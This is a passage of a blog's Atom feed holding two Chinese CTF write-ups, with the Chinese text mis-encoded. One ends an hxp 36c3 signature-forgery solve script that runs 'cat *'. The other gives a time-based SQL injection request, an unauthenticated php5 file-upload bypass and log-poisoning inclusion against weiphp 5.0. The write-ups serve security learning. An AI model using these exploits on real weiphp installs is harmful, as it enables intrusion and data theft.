class="line">print(payload)</span><br><span class="line"></span><br><span class="line">sig  = requests.post(url + <span class="string">&#x27;/sign&#x27;</span>, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload[<span class="string">&#x27;benign&#x27;</span>][<span class="number">0</span>], <span class="string">&#x27;cmd&#x27;</span>: payload[<span class="string">&#x27;benign&#x27;</span>][<span class="number">1</span>]&#125;).text</span><br><span class="line">print(<span class="string">&#x27;[+] sig: &#x27;</span> + sig)</span><br><span class="line"></span><br><span class="line">r = requests.post(url + <span class="string">&#x27;/exec&#x27;</span>, data=&#123;<span class="string">&#x27;signature&#x27;</span>: sig[:<span class="number">172</span>] + payload[<span class="string">&#x27;pwn&#x27;</span>][<span class="number">0</span>]  + <span class="string">&#x27;|&#x27;</span> + payload[<span class="string">&#x27;pwn&#x27;</span>][<span class="number">1</span>]&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> âš™ î‚° SaV-ls-l-aaS î‚° python solve.py 127.0.0.1 60601</span><br><span class="line">[+] IP: 172.17.0.1</span><br><span class="line">fffd fffd fffd fffd fffd fffd 55 fffd fffd fffd fffd c fffd fffd fffd fffd fffd fffd fffd fffd</span><br><span class="line"><span class="built_in">hash</span> count:  168104875 (2^27.32)</span><br><span class="line">kapot count: 3477222 (2^21.73)</span><br><span class="line">table sizes: 8745 8856</span><br><span class="line">[+] gewalt:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001|ls -l</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001|cat *</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;pwn&#x27;</span>: (u<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001&#x27;</span>, u<span class="string">&#x27;cat *&#x27;</span>), <span class="string">&#x27;benign&#x27;</span>: (u<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001&#x27;</span>, u<span class="string">&#x27;ls -l&#x27;</span>)&#125;</span><br><span class="line">[+] sig: ODxSukwtu4rHICBpzT23WGD7DCJNawhA0DUN/tcyv1AgwNmS8OPUnO5FnBBDgiaVx5OTYd4OjH8LVbKiXUBUBuFx1OHDgKBKG5umkKMLt+350SlgMWY5qWny9tPIU3I+X0A9FcADCBCi6f0PkXfc0CSCZXuFu9rAKnVGsbmaUwY=00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001|ls -l</span><br><span class="line">hxp&#123;FLAG&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;36c3 çš„æ—¶å€™çœ‹äº†å¾ˆä¹…&lt;code&gt;SaV-ls-l-aaS&lt;/code&gt;è¿™é“é¢˜ä¹Ÿæ²¡æœ‰åšå‡ºæ¥ï¼Œè¿™é“é¢˜çš„åˆ†ç±»æ˜¯Web&amp;amp;Cryptoï¼Œèµ›åçœ‹äº†é¢˜è§£æ„Ÿè§‰é¢˜çš„è´¨é‡å¾ˆé«˜ï¼Œå‡ºçš„å¾ˆå·§å¦™çš„ä¸€é“é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Crypto" scheme="https://igml.top/tags/Crypto/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>2019 XCTF FINALS weiphp5.0 æ¼æ´æŒ–æ˜</title>
    <link href="https://igml.top/2019/10/30/weiphp5-0/"/>
    <id>https://igml.top/2019/10/30/weiphp5-0/</id>
    <published>2019-10-30T06:24:57.000Z</published>
    <updated>2019-10-30T10:58:55.788Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨2019 XCTF FINALSï¼Œéº¦é¦™å¸ˆå‚…å‡ºäº†ä¸€ä¸ªæœ€æ–°ç‰ˆ weiphp æ¼æ´æŒ–æ˜ï¼Œå‡ºé¢˜äººè¡¨ç¤ºæ¼æ´å¤ªå¤šäº†æ‰€ä»¥åˆ äº†ä¸€éƒ¨åˆ†ä»£ç orzï¼Œé¢˜ç›®æ”¾å‡ºæ¥è²Œä¼¼è¢«æ—¥ç©¿äº†orzï¼ˆè¦æ—¥ä¸€ä¸ªcmsæœ€å¥½çš„åŠæ³•æ„Ÿè§‰æ˜¯æ”¾åˆ°CTFä¸Šï¼‰</p><a id="more"></a><p>é»˜è®¤åº”è¯¥æ˜¯å…³é—­äº†æ³¨å†ŒåŠŸèƒ½ï¼Œæ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬æ²¡æœ‰adminçš„å¯†ç æ˜¯æ— æ³•ç™»å½•çš„ã€‚</p><h2 id="å‰å°sqlæ³¨å…¥"><a href="#å‰å°sqlæ³¨å…¥" class="headerlink" title="å‰å°sqlæ³¨å…¥"></a>å‰å°sqlæ³¨å…¥</h2><p>åœ¨/application/material/controller/Material ä¸‹material_listsæ–¹æ³•ï¼ŒæŸ¥è¯¢ title å¤„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> $title = I(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">        <span class="comment">// dump($title);exit;</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($title)) &#123;</span><br><span class="line">            $map[<span class="string">&#x27;title&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;like&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;%<span class="subst">$title</span>%&quot;</span></span><br><span class="line">            );</span><br><span class="line">            $where .= <span class="string">&quot; and `title` like &#x27;%<span class="subst">$title</span>%&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">$count = M()-&gt;query(<span class="string">&quot;SELECT COUNT( distinct `group_id`) AS tp_count FROM `wp_material_news` WHERE <span class="subst">&#123;$where&#125;</span> LIMIT 1&quot;</span>);</span><br><span class="line">$count = <span class="keyword">isset</span>($count[<span class="number">0</span>][<span class="string">&#x27;tp_count&#x27;</span>]) ? $count[<span class="number">0</span>][<span class="string">&#x27;tp_count&#x27;</span>] : <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°titleæ²¡æœ‰ä»»ä½•è¿‡æ»¤æ‹¼æ¥åˆ°äº†sqlè¯­å¥é‡Œï¼Œè¿™é‡Œå› ä¸ºåªèƒ½å½±å“ count çš„å€¼ï¼Œåé¢æ˜¾ç¤ºçš„éƒ¨åˆ†è°ƒç”¨äº†æ¨¡ç‰ˆå‡½æ•°æ¥æ‰§è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥è€ƒè™‘æ—¶é—´ç›²æ³¨ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/weiphp5.0/public/index.php/Material/Material/material_lists?title=aa%27or%20sleep(5)%23</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.211.55.5</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=gh5hemmrqmujnb10fg8hs29bq8; ScanLoginKey=5db913058c905; __forward__=%2F%2Fweiphp5.0%2Fpublic%2Findex.php%2FMaterial%2FMaterial%2Fmaterial_lists%3Ftitle%3D1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1</span><br><span class="line"></span><br><span class="line"><span class="attribute">a</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¿…é¡»æ˜¯ postï¼Œget è¯·æ±‚åº”è¯¥æ˜¯ä¼šæ¸²æŸ“æ¨¡ç‰ˆä¼šè·³è½¬ç™»å½•ã€‚</p><p>å‘ç°sleepæˆåŠŸï¼Œæ‰”åˆ°sqlmapå°±å¯ä»¥äº†</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-afce833fe26311ae.png" alt="image.png"></p><p>ä¸è¿‡æ•°æ®åº“é‡Œadminçš„å¯†ç æˆ‘ä»¬ä¹Ÿæ˜¯è§£ä¸å‡ºæ¥çš„ï¼Œå› ä¸ºweiphpä½¿ç”¨å¦‚ä¸‹æ–¹æ³•å…¥åº“ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_weiphp_md5</span>(<span class="params">$str, $key = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($key)) &#123;</span><br><span class="line">        $key = config(<span class="string">&#x27;database.data_auth_key&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> === $str ? <span class="string">&#x27;&#x27;</span> : md5(sha1($str) . $key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æ—¶æ¯”èµ›çš„æ—¶å€™ï¼Œå¼€äº†debugæ¨¡å¼ï¼Œå¯¼è‡´ wp_user è¡¨é‡Œlogin_password å­—æ®µè®°å½•äº†adminçš„å¯†ç ï¼Œæ‰€ä»¥ç›´æ¥èƒ½ç™»åå°äº†ã€‚ã€‚ã€‚</p><h2 id="å…ç™»å½•æ–‡ä»¶ä¸Šä¼ "><a href="#å…ç™»å½•æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å…ç™»å½•æ–‡ä»¶ä¸Šä¼ "></a>å…ç™»å½•æ–‡ä»¶ä¸Šä¼ </h2><p>é¦–é¡µæºä»£ç é‡Œï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a94ec5b09af9dfef.png" alt="image.png"></p><p>è®¿é—®upload_dialog_urlï¼Œå‘ç°æœ‰å¯ä»¥ä¸Šä¼ ï¼ŒæŠ“åŒ…å¾—åˆ°ä¸Šä¼ åŒ…ï¼Œå‘ç°è¦ç™»å½•ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-03a037c4649dbc78.png" alt="image.png"></p><p>å®šä½fileæ§åˆ¶å™¨upload_pictureæ–¹æ³•ï¼Œå‘ç°æœ‰é‰´æƒï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_picture</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> ç”¨æˆ·ç™»å½•æ£€æµ‹</span></span><br><span class="line">        <span class="keyword">if</span> (!is_login())&#123;</span><br><span class="line">        $return = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œè¯·å…ˆç™»å½•&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> json($return);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ‰ä¸ªupload_root æ–¹æ³•æ²¡æœ‰é‰´æƒï¼Œç›´æ¥å¯ä»¥ä¸Šä¼ :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_root</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $return = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;ä¸Šä¼ æˆåŠŸ&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">/* è°ƒç”¨æ–‡ä»¶ä¸Šä¼ ç»„ä»¶ä¸Šä¼ æ–‡ä»¶ */</span></span><br><span class="line">    $File = D(<span class="string">&#x27;home/File&#x27;</span>);</span><br><span class="line">    $file_driver = strtolower(config(<span class="string">&#x27;picture_upload_driver&#x27;</span>));</span><br><span class="line">    $setting = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;rootPath&#x27;</span> =&gt; <span class="string">&#x27;./&#x27;</span> ,</span><br><span class="line">    );</span><br><span class="line">    $info = $File-&gt;upload($setting, config(<span class="string">&#x27;picture_upload_driver&#x27;</span>), config(<span class="string">&quot;upload_<span class="subst">&#123;$file_driver&#125;</span>_config&quot;</span>));</span><br><span class="line"><span class="comment">//     $info = $File-&gt;upload(config(&#x27;download_upload&#x27;), config(&#x27;picture_upload_driver&#x27;), config(&quot;upload_&#123;$file_driver&#125;_config&quot;));</span></span><br><span class="line">    <span class="comment">/* è®°å½•é™„ä»¶ä¿¡æ¯ */</span></span><br><span class="line">    <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">    $return[<span class="string">&#x27;status&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">    $return = array_merge($info[<span class="string">&#x27;download&#x27;</span>], $return);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $return[<span class="string">&#x27;status&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    $return[<span class="string">&#x27;info&#x27;</span>] = $File-&gt;getError();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* è¿”å›JSONæ•°æ® */</span></span><br><span class="line">    <span class="keyword">return</span> json_encode($return);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨php5å°±å¯ä»¥ç»•è¿‡ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-75670a9b451493ef.png" alt="image.png"></p><p>æˆåŠŸä¸Šä¼ ï¼Œæ–‡ä»¶è·¯å¾„<code>/public/uploads/download/20191030/5db9681e2d701.php5</code></p><h2 id="ç™»å½•åå°æ–‡ä»¶ä¸Šä¼ "><a href="#ç™»å½•åå°æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ç™»å½•åå°æ–‡ä»¶ä¸Šä¼ "></a>ç™»å½•åå°æ–‡ä»¶ä¸Šä¼ </h2><p>ç™»å½•åuploadå¤„éšä¾¿ä¼ ï¼ŒåŒæ ·ç”¨php5æˆ–è€…php7å°±è¡Œï¼š</p><p>upload_pictureå¤„åº”è¯¥æœ‰åç¼€åç™½åå•ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-92dec9c7072c0adb.png" alt="image.png"></p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>å‡ºé¢˜äººé¢„æœŸè§£æ˜¯<code>/application/common/controller/base.php</code>ä¸­çš„<code>common_lists</code>æ–¹æ³•ï¼Œ$templateFileå¯ä»¥é€šè¿‡å‚æ•°ç»‘å®šæ–¹å¼æ§åˆ¶ï¼Œç”¨uaå¤´æŠŠå‘½ä»¤å†™æ—¥å¿—é‡Œç„¶ååŒ…å«æ—¥å¿—æ‰§è¡Œå‘½ä»¤ã€‚</p><p>è¿™ä¸ªcmsæ´ç¡®å®æ¯”è¾ƒå¤šï¼Œä¸ç™»å½•ä¹Ÿèƒ½ä¼ shellï¼Œä¹Ÿèƒ½sqlæ³¨å…¥â€¦ adminç®¡ç†åå°ä¼°è®¡è¿˜æœ‰æ´ã€‚</p>]]></content>
    
    
    <summary type="html">2019 XCTF FINALS weiphp5.0 æ¼æ´æŒ–æ˜</summary>
    
    
    
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
  </entry>
  
</feed>
